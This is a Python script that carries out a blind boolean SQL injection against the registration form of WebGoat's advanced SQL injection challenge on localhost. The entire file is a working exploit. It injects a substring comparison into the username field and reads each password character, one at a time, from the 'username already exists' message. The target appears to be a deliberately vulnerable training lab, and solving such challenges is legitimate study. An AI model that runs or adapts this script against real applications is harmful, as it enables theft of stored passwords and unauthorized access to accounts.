import json
import requests

#character set
CHARACTER_SET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'

#base url endpoint
BASE_URL = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'

#session header 
SESSION_HEADERS = {
    'Cookie': "JSESSIONID=stwGcaftyQKVEJJ0zFtNGJXVBHNWGCfPLJnWcWBG",  
}

#Function to send SQL injection request and return the response
def send_request(payload):
    """Send a request to check if the password character matches."""
    payload_data = {
        'username_reg': payload,
        'email_reg': 'test@test.com',
        'password_reg': 'test123',
        'confirm_password_reg': 'test123'
    }
    return requests.put(BASE_URL, headers=SESSION_HEADERS, data=payload_data)

#function to extract the character at the specified index
def extract_character_at_index(index):
    """Extract the character at the specified index of the password."""
    for candidate_char in CHARACTER_SET:
        #SQL payload to check if the current character matches
        payload = f"tom' AND substring(password, {index + 1}, 1) = '{candidate_char}';--"
        
        response = send_request(payload)
        
        try:
            response_json = response.json()  
        except json.JSONDecodeError:
            print("Session ID may be invalid or the request format is incorrect. Please validate your session.")
            return None
            
        #Check if the response indicates a successful character match
        if "already exists please try to register with a different username" in response_json.get('feedback', ''):
            return candidate_char 
    
    return None 

#main function to extract password 
def extract_password_via_sqli():
    """Extract the password character by character using SQL injection."""
    found_password = ''  
    current_index = 0  

    while True:
        matched_character = extract_character_at_index(current_index)

        if matched_character is not None:
            found_password += matched_character 
            print(f"Password so far: {found_password}")
            current_index += 1 
        else:
            print("Password extraction complete.")
            break

#function call to extract password
extract_password_via_sqli()